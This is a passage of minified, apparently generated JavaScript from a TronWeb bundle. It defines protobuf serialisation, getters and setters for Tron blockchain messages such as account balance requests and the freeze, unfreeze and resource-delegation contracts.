                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                return TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setHash(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setNumber(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getHash_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getNumber()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash_asB64 = function() {
                return n.Message.bytesAsB64(this.getHash())
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash_asU8 = function() {
                return n.Message.bytesAsU8(this.getHash())
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.setHash = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getNumber = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.setNumber = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.getBlockIdentifier = function() {
                return n.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 1)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.setBlockIdentifier = function(e) {
                return n.Message.setWrapperField(this, 1, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.clearBlockIdentifier = function() {
                return this.setBlockIdentifier(void 0)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.hasBlockIdentifier = function() {
                return null != n.Message.getField(this, 1)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.getTimestamp = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.setTimestamp = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.getTransactionBalanceTraceList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.TransactionBalanceTrace, 3)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.setTransactionBalanceTraceList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 3, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.addTransactionBalanceTrace = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 3, e, TronWebProto.TransactionBalanceTrace, t)
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.clearTransactionBalanceTraceList = function() {
                return this.setTransactionBalanceTraceList([])
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountTrace.prototype.toObject = function(e) {
                return TronWebProto.AccountTrace.toObject(e, this)
            }
            ,
            TronWebProto.AccountTrace.toObject = function(e, t) {
                var r = {
                    balance: n.Message.getFieldWithDefault(t, 1, 0),
                    placeholder: n.Message.getFieldWithDefault(t, 99, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AccountTrace.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountTrace;
                return TronWebProto.AccountTrace.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountTrace.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setBalance(r);
                        break;
                    case 99:
                        r = t.readInt64();
                        e.setPlaceholder(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountTrace.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountTrace.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountTrace.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getBalance()) && t.writeInt64(1, r),
                0 !== (r = e.getPlaceholder()) && t.writeInt64(99, r)
            }
            ,
            TronWebProto.AccountTrace.prototype.getBalance = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.AccountTrace.prototype.setBalance = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.AccountTrace.prototype.getPlaceholder = function() {
                return n.Message.getFieldWithDefault(this, 99, 0)
            }
            ,
            TronWebProto.AccountTrace.prototype.setPlaceholder = function(e) {
                return n.Message.setProto3IntField(this, 99, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountIdentifier.prototype.toObject = function(e) {
                return TronWebProto.AccountIdentifier.toObject(e, this)
            }
            ,
            TronWebProto.AccountIdentifier.toObject = function(e, t) {
                var r = {
                    address: t.getAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AccountIdentifier.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountIdentifier;
                return TronWebProto.AccountIdentifier.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountIdentifier.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    if (1 === t.getFieldNumber()) {
                        var r = t.readBytes();
                        e.setAddress(r)
                    } else
                        t.skipField()
                }
                return e
            }
            ,
            TronWebProto.AccountIdentifier.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountIdentifier.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountIdentifier.serializeBinaryToWriter = function(e, t) {
                var r;
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(1, r)
            }
            ,
            TronWebProto.AccountIdentifier.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AccountIdentifier.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.AccountIdentifier.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.AccountIdentifier.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountBalanceRequest.prototype.toObject = function(e) {
                return TronWebProto.AccountBalanceRequest.toObject(e, this)
            }
            ,
            TronWebProto.AccountBalanceRequest.toObject = function(e, t) {
                var r, n = {
                    accountIdentifier: (r = t.getAccountIdentifier()) && TronWebProto.AccountIdentifier.toObject(e, r),
                    blockIdentifier: (r = t.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(e, r)
                };
                return e && (n.$jspbMessageInstance = t),
                n
            }
            ),
            TronWebProto.AccountBalanceRequest.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountBalanceRequest;
                return TronWebProto.AccountBalanceRequest.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountBalanceRequest.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = new TronWebProto.AccountIdentifier;
                        t.readMessage(r, TronWebProto.AccountIdentifier.deserializeBinaryFromReader),
                        e.setAccountIdentifier(r);
                        break;
                    case 2:
                        r = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                        t.readMessage(r, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                        e.setBlockIdentifier(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountBalanceRequest.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountBalanceRequest.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                null != (r = e.getAccountIdentifier()) && t.writeMessage(1, r, TronWebProto.AccountIdentifier.serializeBinaryToWriter),
                null != (r = e.getBlockIdentifier()) && t.writeMessage(2, r, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.getAccountIdentifier = function() {
                return n.Message.getWrapperField(this, TronWebProto.AccountIdentifier, 1)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.setAccountIdentifier = function(e) {
                return n.Message.setWrapperField(this, 1, e)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.clearAccountIdentifier = function() {
                return this.setAccountIdentifier(void 0)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.hasAccountIdentifier = function() {
                return null != n.Message.getField(this, 1)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.getBlockIdentifier = function() {
                return n.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 2)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.setBlockIdentifier = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.clearBlockIdentifier = function() {
                return this.setBlockIdentifier(void 0)
            }
            ,
            TronWebProto.AccountBalanceRequest.prototype.hasBlockIdentifier = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountBalanceResponse.prototype.toObject = function(e) {
                return TronWebProto.AccountBalanceResponse.toObject(e, this)
            }
            ,
            TronWebProto.AccountBalanceResponse.toObject = function(e, t) {
                var r, o = {
                    balance: n.Message.getFieldWithDefault(t, 1, 0),
                    blockIdentifier: (r = t.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(e, r)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.AccountBalanceResponse.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountBalanceResponse;
                return TronWebProto.AccountBalanceResponse.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountBalanceResponse.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setBalance(r);
                        break;
                    case 2:
                        r = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                        t.readMessage(r, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                        e.setBlockIdentifier(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountBalanceResponse.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountBalanceResponse.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getBalance()) && t.writeInt64(1, r),
                null != (r = e.getBlockIdentifier()) && t.writeMessage(2, r, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.getBalance = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.setBalance = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.getBlockIdentifier = function() {
                return n.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 2)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.setBlockIdentifier = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.clearBlockIdentifier = function() {
                return this.setBlockIdentifier(void 0)
            }
            ,
            TronWebProto.AccountBalanceResponse.prototype.hasBlockIdentifier = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.FreezeBalanceV2Contract.prototype.toObject = function(e) {
                return TronWebProto.FreezeBalanceV2Contract.toObject(e, this)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    frozenBalance: n.Message.getFieldWithDefault(t, 2, 0),
                    resource: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.FreezeBalanceV2Contract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.FreezeBalanceV2Contract;
                return TronWebProto.FreezeBalanceV2Contract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setFrozenBalance(r);
                        break;
                    case 3:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.FreezeBalanceV2Contract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getFrozenBalance()) && t.writeInt64(2, r),
                0 !== (r = e.getResource()) && t.writeEnum(3, r)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.getFrozenBalance = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.setFrozenBalance = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.FreezeBalanceV2Contract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UnfreezeBalanceV2Contract.prototype.toObject = function(e) {
                return TronWebProto.UnfreezeBalanceV2Contract.toObject(e, this)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    unfreezeBalance: n.Message.getFieldWithDefault(t, 2, 0),
                    resource: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UnfreezeBalanceV2Contract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UnfreezeBalanceV2Contract;
                return TronWebProto.UnfreezeBalanceV2Contract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setUnfreezeBalance(r);
                        break;
                    case 3:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UnfreezeBalanceV2Contract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getUnfreezeBalance()) && t.writeInt64(2, r),
                0 !== (r = e.getResource()) && t.writeEnum(3, r)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.getUnfreezeBalance = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.setUnfreezeBalance = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.UnfreezeBalanceV2Contract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.WithdrawExpireUnfreezeContract.prototype.toObject = function(e) {
                return TronWebProto.WithdrawExpireUnfreezeContract.toObject(e, this)
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.WithdrawExpireUnfreezeContract;
                return TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    if (1 === t.getFieldNumber()) {
                        var r = t.readBytes();
                        e.setOwnerAddress(r)
                    } else
                        t.skipField()
                }
                return e
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.WithdrawExpireUnfreezeContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.serializeBinaryToWriter = function(e, t) {
                var r;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r)
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.WithdrawExpireUnfreezeContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.DelegateResourceContract.prototype.toObject = function(e) {
                return TronWebProto.DelegateResourceContract.toObject(e, this)
            }
            ,
            TronWebProto.DelegateResourceContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    resource: n.Message.getFieldWithDefault(t, 2, 0),
                    balance: n.Message.getFieldWithDefault(t, 3, 0),
                    receiverAddress: t.getReceiverAddress_asB64(),
                    lock: n.Message.getBooleanFieldWithDefault(t, 5, !1),
                    lockPeriod: n.Message.getFieldWithDefault(t, 6, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.DelegateResourceContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.DelegateResourceContract;
                return TronWebProto.DelegateResourceContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.DelegateResourceContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setBalance(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setReceiverAddress(r);
                        break;
                    case 5:
                        r = t.readBool();
                        e.setLock(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setLockPeriod(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.DelegateResourceContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.DelegateResourceContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getResource()) && t.writeEnum(2, r),
                0 !== (r = e.getBalance()) && t.writeInt64(3, r),
                (r = e.getReceiverAddress_asU8()).length > 0 && t.writeBytes(4, r),
                (r = e.getLock()) && t.writeBool(5, r),
                0 !== (r = e.getLockPeriod()) && t.writeInt64(6, r)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 2, e)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getBalance = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setBalance = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getReceiverAddress = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getReceiverAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getReceiverAddress())
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getReceiverAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getReceiverAddress())
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setReceiverAddress = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getLock = function() {
                return n.Message.getBooleanFieldWithDefault(this, 5, !1)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setLock = function(e) {
                return n.Message.setProto3BooleanField(this, 5, e)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.getLockPeriod = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.DelegateResourceContract.prototype.setLockPeriod = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UnDelegateResourceContract.prototype.toObject = function(e) {
                return TronWebProto.UnDelegateResourceContract.toObject(e, this)
            }
            ,
            TronWebProto.UnDelegateResourceContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    resource: n.Message.getFieldWithDefault(t, 2, 0),
                    balance: n.Message.getFieldWithDefault(t, 3, 0),
                    receiverAddress: t.getReceiverAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UnDelegateResourceContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UnDelegateResourceContract;
                return TronWebProto.UnDelegateResourceContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UnDelegateResourceContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setBalance(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setReceiverAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UnDelegateResourceContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UnDelegateResourceContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getResource()) && t.writeEnum(2, r),
                0 !== (r = e.getBalance()) && t.writeInt64(3, r),
                (r = e.getReceiverAddress_asU8()).length > 0 && t.writeBytes(4, r)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 2, e)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getBalance = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.setBalance = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getReceiverAddress())
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getReceiverAddress())
            }
            ,
            TronWebProto.UnDelegateResourceContract.prototype.setReceiverAddress = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.CancelAllUnfreezeV2Contract.prototype.toObject = function(e) {
                return TronWebProto.CancelAllUnfreezeV2Contract.toObject(e, this)
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.CancelAllUnfreezeV2Contract;
                return TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    if (1 === t.getFieldNumber()) {
                        var r = t.readBytes();
                        e.setOwnerAddress(r)
                    } else
                        t.skipField()
                }
                return e
            }
